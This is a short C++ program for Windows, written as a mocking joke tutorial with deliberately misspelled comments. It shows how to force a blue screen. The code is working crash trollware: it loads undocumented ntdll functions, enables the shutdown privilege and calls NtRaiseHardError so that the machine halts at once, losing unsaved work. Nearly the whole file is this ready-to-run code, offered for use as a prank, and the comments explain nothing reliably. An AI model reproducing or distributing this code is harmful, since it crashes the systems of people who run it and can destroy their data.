// hi gays today illl show you gays how o get blutoot scween

//firsst start off by inlcuidng dafringging uhh windows balls
#include <Windows.h>
// yes so thats not doinge done
// nob we do whatever this means

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

// now we make funktinonction to make it work

void bluetooth()
{
	BOOLEAN enabled;
	ULONG response;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &enabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &response);
} // thyes so diz is za function, tozally not pazzed

int main()
{
	// now qwe ecexcute the funtion
	bluetooth();
	// so yez diz is za blotooth function it will gig u za bluetoothscreengreen

	/*bye gusgays*/
}